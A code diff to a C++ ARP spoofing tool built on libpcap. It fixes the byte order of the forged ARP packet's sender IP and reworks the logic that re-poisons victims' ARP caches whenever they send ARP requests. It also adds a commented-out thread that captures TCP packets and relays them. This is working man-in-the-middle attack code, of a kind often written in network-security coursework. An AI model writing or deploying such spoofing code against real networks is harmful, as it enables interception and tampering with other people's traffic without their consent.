@@ -104,7 +104,7 @@ void send_arp(pcap_t* handle, Mac my_mac, Mac s_mac, Ip s_ip, Ip t_ip)
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
 	packet.arp_.smac_ = my_mac;
-	packet.arp_.sip_ = s_ip;
+	packet.arp_.sip_ = htonl(s_ip);
 	packet.arp_.tmac_ = (s_mac == Mac("ff:ff:ff:ff:ff:ff")) ? Mac("00:00:00:00:00:00") : s_mac;
 	packet.arp_.tip_ = htonl(t_ip);
 	
@@ -167,9 +167,10 @@ public:
     void process_work_que() {
         std::thread spoofing_thread(&arp_spoofing::send_spoofing, this);
         std::thread listening_thread(&arp_spoofing::capture_and_push_work_que, this);
-
+        //std::thread tcp_capture_and_replay_thread(&arp_spoofing::tcp_capture_and_replay, this);
         spoofing_thread.join();
         listening_thread.join();
+        //tcp_catpture_and_replay_thread.join();
     }
 
 private:
@@ -205,32 +206,53 @@ private:
             Ip sender_ip = Ip(ntohl(recv_packet->arp_.sip_));
             Ip target_ip = Ip(ntohl(recv_packet->arp_.tip_));
 
-            if (recv_packet->eth_.type() == htons(EthHdr::Arp) && recv_packet->arp_.op() == htons(ArpHdr::Request)) {
-                if (recv_packet->arp_.tmac_ == Mac::nullMac()) { // Broadcast
-                    if (sender_to_target.count(sender_ip) > 0) {
-                        auto range = sender_to_target.equal_range(sender_ip);
-                        std::multimap<Ip, Ip> temp_map;
-                        for (auto it = range.first; it != range.second; ++it) {
-                            temp_map.insert(*it);
-                        }
-                        fill_work_que(temp_map);
-                    } 
-                    if (target_to_sender.count(target_ip) > 0) {
-                        auto range = target_to_sender.equal_range(target_ip);
-                        std::multimap<Ip, Ip> temp_map;
-                        for (auto it = range.first; it != range.second; ++it) {
-                            temp_map.insert(*it);
-                        }
-                        fill_work_que(temp_map);
-                    }
-                } else { // Unicast
+            if (!(recv_packet->eth_.type() == EthHdr::Arp && recv_packet->arp_.op() == htons(ArpHdr::Request))) {
+                return;
+            }
+            if (recv_packet->arp_.tmac_ == Mac::nullMac()) { // Broadcast
+                if (sender_to_target.count(sender_ip) > 0) {
+                    auto range = sender_to_target.equal_range(sender_ip);
                     std::multimap<Ip, Ip> temp_map;
-                    temp_map.insert({sender_ip, target_ip});
+                    for (auto it = range.first; it != range.second; ++it) {
+                        temp_map.insert(*it);
+                    }
+                    fill_work_que(temp_map);
+                } 
+                if (target_to_sender.count(target_ip) > 0) {
+                    auto range = target_to_sender.equal_range(target_ip);
+                    std::multimap<Ip, Ip> temp_map;
+                    for (auto it = range.first; it != range.second; ++it) {
+                        temp_map.insert(*it);
+                    }
                     fill_work_que(temp_map);
                 }
+            } else { // Unicast
+                std::multimap<Ip, Ip> temp_map;
+                temp_map.insert({sender_ip, target_ip});
+                fill_work_que(temp_map);
             }
         }
     }
+/*
+    void tcp_capture_and_replay() {
+        struct pcap_pkthdr* header;
+        const u_char* packet_data;
+
+        while (true) {
+            int res = pcap_next_ex(handle, &header, &packet_data);
+            if (res == 0 || res == -1 || res == -2) {
+                continue;
+            }
+            EthHdr* eth = (EthHdr*)packet_data;
+            if (eth->type() == EthHdr::Ip4) {
+                IpHdr* ip = (IpHdr*)(packet_data + sizeof(EthHdr));
+                if (ip->p_ == IPPROTO_TCP) {
+                    TcpHdr* tcp = (TcpHdr*)(packet_data + sizeof(EthHdr) + ip->h_len() * 4);
+                    pcap_sendpacket(handle, packet_data, header->caplen);
+                }
+            }
+        }
+    }*/
 };
 
 int main(int argc, char* argv[]) {
